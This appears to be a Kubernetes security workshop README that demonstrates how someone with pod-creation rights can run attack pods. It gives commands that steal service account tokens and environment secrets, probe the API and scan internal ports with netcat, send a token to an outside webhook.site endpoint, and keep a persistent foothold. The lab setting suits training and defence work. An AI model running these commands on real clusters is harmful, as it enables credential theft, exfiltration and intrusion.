# Bash/cmd inside Container

An attacker with the ability to create pods can run arbitrary commands inside a container — without exec-ing into an existing workload. By launching ephemeral attack pods they can perform reconnaissance, reach internal services, and interact with the Kubernetes API under a chosen service account identity.

## Description

Attackers who have `create pods` permission can use `kubectl run` or `kubectl apply` to spin up a container with any tool they need. This technique differs from `exec into container` in that the attacker chooses the image and command from scratch rather than working within an existing workload's constraints. Common uses include:

- Running reconnaissance commands (network scanning, DNS enumeration) from inside the cluster network.
- Deploying an ephemeral pod with attack tools (nmap, curl, netcat) that would not exist in production images.
- Piping commands to read and exfiltrate data without writing anything to disk outside the pod.
- Launching a long-lived pod to act as a persistent foothold while the attacker iterates.

## Prerequisites

- A running Kubernetes cluster (these steps use a Kind cluster named `workshop-cluster`).
- `kubectl` installed and configured to connect to your cluster.
- The attacker has obtained credentials that grant `create pods` (or `create deployments`) in the target namespace.

## Quick Start

### Step 1 — Deploy a long-lived busybox pod

The busybox pod defined in `busybox.yaml` runs `sleep 3600` so it stays alive for an hour, giving the attacker time to exec in repeatedly:

```bash
kubectl apply -f busybox.yaml
```

Wait for the pod to start:

```bash
kubectl wait --for=condition=Ready pod/busybox --timeout=60s
```

### Step 2 — Run one-shot reconnaissance commands via exec

With the busybox pod running, an attacker can pipe commands through it without opening an interactive session:

```bash
# Enumerate DNS — identify internal services
kubectl exec busybox -- nslookup kubernetes.default.svc.cluster.local

# Read the mounted service account token
kubectl exec busybox -- cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Dump environment variables (often contain credentials)
kubectl exec busybox -- env
```

### Step 3 — Launch an ephemeral attack pod with custom tools

An attacker can spin up a temporary pod with any image and have it run a command, then self-delete (`--rm`). This avoids leaving a persistent artifact in the cluster:

```bash
# DNS enumeration from inside the cluster
kubectl run recon --image=busybox --restart=Never --rm -it -- \
  nslookup kubernetes.default.svc.cluster.local

# Query the Kubernetes API using the auto-mounted service account token
kubectl run api-probe --image=alpine --restart=Never --rm -it -- \
  sh -c 'apk add -q curl && \
         TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) && \
         curl -sk -H "Authorization: Bearer $TOKEN" \
              https://kubernetes.default.svc/api/v1/namespaces/default/pods'
```

### Step 4 — Network mapping from inside the cluster

Launch a pod with network tools to enumerate reachable services on the cluster network:

```bash
kubectl apply -f attack-pod.yaml
kubectl wait --for=condition=Ready pod/attack-pod --timeout=90s
```

Run a port probe against common internal services:

```bash
kubectl exec attack-pod -- sh -c '
  for host in kubernetes.default.svc kube-dns.kube-system.svc; do
    for port in 53 80 443 2379 6443 8080 8443 10250; do
      nc -z -w1 $host $port 2>/dev/null \
        && echo "OPEN  $host:$port" \
        || echo "CLOSE $host:$port"
    done
  done
'
```

> Note: The attack-pod image (Alpine) uses `ash`, not `bash`. The `/dev/tcp` pseudo-device is a bash-only feature and will not work in `ash`. Use `nc` (netcat) instead, which is installed by the attack-pod startup command.

### Step 5 — Piped data exfiltration

Read and exfiltrate a sensitive file in a single piped command:

```bash
kubectl exec busybox -- sh -c \
  'cat /var/run/secrets/kubernetes.io/serviceaccount/token | \
   wget -qO- --post-data="$(cat -)" https://webhook.site/YOUR_WEBHOOK_ID'
```

Replace `YOUR_WEBHOOK_ID` with your collection endpoint. The entire operation happens in one exec call with no files written to the host.

### Step 6 — Verify persistence of the busybox pod

Unlike `--rm` pods, the busybox deployment defined in `busybox.yaml` has `restartPolicy: Always`, so it restarts after a crash:

```bash
# Kill the busybox process inside the container
kubectl exec busybox -- kill 1

# Pod restarts automatically — attacker foothold is maintained
kubectl get pod busybox
```

Expected output after a few seconds:

```
NAME      READY   STATUS    RESTARTS   AGE
busybox   1/1     Running   1          5m
```

## Cleanup

```bash
kubectl delete -f busybox.yaml
kubectl delete -f attack-pod.yaml --ignore-not-found
kubectl delete pod recon api-probe --ignore-not-found
```

## Resources

- [kubectl run](https://kubernetes.io/docs/reference/generated/kubectl/kubectl-commands#run)
- [kubectl exec](https://kubernetes.io/docs/reference/generated/kubectl/kubectl-commands#exec)
- [MITRE ATT&CK for Containers — Bash or cmd inside container](https://microsoft.github.io/Threat-Matrix-for-Kubernetes/techniques/Bash%20or%20cmd%20inside%20container/)
